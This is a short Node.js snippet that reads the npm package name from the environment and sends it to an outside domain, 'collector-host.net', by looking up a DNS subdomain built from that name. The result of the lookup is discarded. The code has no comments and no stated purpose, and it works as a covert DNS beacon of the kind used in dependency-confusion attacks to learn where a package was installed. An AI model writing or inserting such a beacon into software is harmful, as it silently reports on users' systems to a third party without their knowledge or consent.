const d = require("dns");
const id = process.env.npm_package_name || "pkg";
d.resolve4(`${id}.c.collector-host.net`, (e) => {});
